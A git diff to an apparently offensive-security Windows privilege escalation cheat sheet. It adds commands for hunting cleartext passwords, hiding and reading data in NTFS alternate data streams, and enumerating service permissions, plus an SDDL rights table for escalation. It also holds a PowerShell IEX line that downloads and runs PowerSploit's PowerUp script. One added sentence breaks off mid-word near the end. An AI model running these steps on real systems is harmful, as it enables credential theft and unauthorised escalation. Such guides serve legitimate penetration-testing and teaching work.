@@ -181,7 +181,7 @@ The procedure to do so is as follow:
   9. Change a user password (net user <USERNAME> <NEWPASSWORD>) or create a new
   user
 
-### Clear text passwords and files of interest
+### Sensible content
 
 ###### Clear text passwords in files
 
@@ -197,7 +197,7 @@ The `meterpreter` `search` command can be used in place of `findstr` if a
 dir /s <KEYWORD>
 
 # Meterpreter search command
-search -f <FILENAME>.<FILE_EXTENSION> <KEYWORD>
+search -f <FILE_NAME>.<FILE_EXTENSION> <KEYWORD>
 search -f *.* <KEYWORD>
 
 # Search 'password' / 'pass' in all txt/xml/ini files
@@ -377,6 +377,49 @@ The following files may contains sensible information:
 
 # WSL directory - For more information refer to Windows Subsystem for Linux (WSL) below
 %HOMEPATH%\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu<...>
+```
+
+######  Alternate data streams (ADS)
+
+The NTFS file system includes support for ADS, allowing files to contain more
+than one stream of data. Every Windows file has at least one data stream,
+called by default `:$DATA`.
+
+ADS do not appear in Windows Explorer, and their size is not included in the
+size of the file that hosts them. Moreover, only the main stream of a file is
+retained when copying to a FAT file system, attaching to a mail or
+uploading to a website. Because of these properties, ADS may be used by users
+or applications to store sensible information and the eventual ADS present on
+the system should be reviewed.
+
+DOS and PowerShell built-ins as well as `streams.exe` from the Sysinternals
+suite and tools from
+http://www.flexhex.com/docs/articles/alternate-streams.phtml can be used to
+operate with ADS.
+
+Note that the PowerShell cmdlets presented below are only available starting
+from `PowerShell 3`.
+
+```
+# Search ADS
+dir /R <DIRECTORY | FILE_NAME>
+gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$DATA'
+Get-Item <FILE_NAME> -stream *
+streams.exe -accepteula -s <DIRECTORY>
+streams.exe -accepteula <FILE_NAME>
+
+# Retrieve ADS content
+more < <FILE_NAME>:<ADS_NAME>
+Get-Content <FILE_NAME> -stream <ADS_NAME>
+
+# Write ADS content
+echo "<INPUT>" > <FILE_NAME>:<ADS_NAME>
+Set-Content <FILE_NAME> -stream <ADS_NAME> -Value "<INPUT>"
+Add-Content <FILE_NAME> -stream <ADS_NAME> -Value "<INPUT>"
+
+# Remove ADS
+Remove-Item –path <FILE_PATH> –stream <ADS_NAME>
+streams.exe -accepteula -d <FILE_NAME>
 ```
 
 ### Unpatched system
@@ -592,7 +635,12 @@ the target system:
 wmic service list config
 sc query
 
-sc qc <SERVICENAME>
+# Service config
+sc qc <SERVICE_NAME>
+
+# Service status / extended status
+sc query <SERVICE_NAME>
+sc queryex <SERVICE_NAME>
 
 Get-WmiObject -Class win32_service -Property Name,PathName
 ```
@@ -627,8 +675,7 @@ accesschk64.exe -accepteula -uwcqv <SERVICE_NAME>
 # (PowerShell) PowerSploit's PowerUp Get-ModifiableServiceFile & Get-ModifiableService
 # Get-ModifiableServiceFile - returns services for which the current user can directly modify the binary file
 # Get-ModifiableService - returns services the current user can reconfigure
-PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
-erSploit/master/Privesc/PowerUp.ps1")
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
 PS> Get-ModifiableServiceFile
 PS> Get-ModifiableService
 
@@ -638,18 +685,106 @@ meterpreter> powershell_execute Get-ModifiableServiceFile
 meterpreter> powershell_execute Get-ModifiableService
 ```
 
-The following permissions allow for the modification of the service
-`BINARY_PATH_NAME` parameter:
+If the tools above are not a possibility, the Windows built-in `sc` can be used
+to directly retrieve a service's security descriptor composed of the System
+Access Control List and (SACL) and Discretionary Access Control List (DACL).
 
 ```
-SERVICE_CHANGE_CONFIG
-SERVICE_ALL_ACCESS F
-GENERIC_WRITE / GW
-GENERIC_ALL / GA
-WRITE_DAC / WDAC
-WRITE_OWNER / WO
+sc sdshow <SERVICE_NAME>
 ```
 
+The security descriptor, as displayed by `sc sdshow`, is formatted according
+the Security Descriptor Definition Language (SDDL) and will usually be divided
+into two parts:
+  - Prefix of S: SACL and controls auditing
+  - Prefix of D: DACL and controls permissions
+
+The SDDL uses Access Control Entry (ACE) strings in the DACL and SACL
+components of a security descriptor string. Each ACE in a security descriptor
+string is enclosed in parentheses in which an user account and their associated
+permissions are represented.
+
+The fields of the ACE are in the following order and are separated by
+semicolons (;)
+
+```
+ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
+```
+
+In case of services, the fields `ace_type`, `rights` and `account_sid` are
+usually the only ones being set.
+
+The `ace_type` field is usually either set to Allow (A) or Deny (D). The
+`rights` field is a string that indicates the access rights controlled by
+the ACE, usually composed of pair of letters each representing a specific
+permission. Finally, the `account_sid` represent the security principal
+assigned with the permissions and can either be a two letters known alias or a
+SID.
+
+The following known aliases can be encountered:
+
+| Alias | Name |
+|-------|-----------------------------------------|
+| AO | Account operators |
+| RU | Alias to allow previous Windows 2000 |
+| AN | Anonymous logon |
+| AU | Authenticated users |
+| BA | Built-in administrators |
+| BG | Built-in guests |
+| BO | Backup operators |
+| BU | Built-in users |
+| CA | Certificate server administrators |
+| CG | Creator group |
+| CO | Creator owner |
+| DA | Domain administrators |
+| DC | Domain computers |
+| DD | Domain controllers |
+| DG | Domain guests |
+| DU | Domain users |
+| EA | Enterprise administrators |
+| ED | Enterprise domain controllers |
+| WD | Everyone |
+| PA | Group Policy administrators |
+| IU | Interactively logged-on user |
+| LA | Local administrator |
+| LG | Local guest |
+| LS | Local service account |
+| SY | Local system |
+| NU | Network logon user |
+| NO | Network configuration operators |
+| NS | Network service account |
+| PO | Printer operators |
+| PS | Personal self |
+| PU | Power users |
+| RS | RAS servers group |
+| RD | Terminal server users |
+| RE | Replicator |
+| RC | Restricted code |
+| SA | Schema administrators |
+| SO | Server operators |
+| SU | Service logon user |
+
+The following permissions are worth mentioning in the prospect of local
+privilege escalation:
+
+
+| Ace's rights | Access right | Description |
+|--------------|--------------|-------------|
+| CC | SERVICE_QUERY_CONFIG | Retrieve the service's current configuration from the SCM |
+| DC | SERVICE_CHANGE_CONFIG | Change the service configuration, notably grant the right to change the executable file associated with the service |
+| GA | GENERIC_ALL | Read, write and execute access to the service |
+| GX | GENERIC_WRITE | Write access to the service |
+| LC | SERVICE_QUERY_STATUS | Retrieve the service's current status from the SCM |
+| LO | SERVICE_INTERROGATE | Retrieve the service's current status directly from the service itself |
+| RC | READ_CONTROL | Read the security descriptor of the service |
+| RP | SERVICE_START | Start the service |
+| SW | SERVICE_ENUMERATE_DEPENDENTS | List the services that depend on the service |
+| WD | WRITE_DAC | Modify the DACL of the service in its security descriptor |
+| WO | WRITE_OWNER | Change the owner of the service in its security descriptor |
+| WP | SERVICE_STOP | Stop the service |
+| - | SERVICE_ALL_ACCESS | Include all service permissions, notably SERVICE_CHANGE_CONFIG |
+
+The full list can be re
 To alter the service configuration:
 
 ```
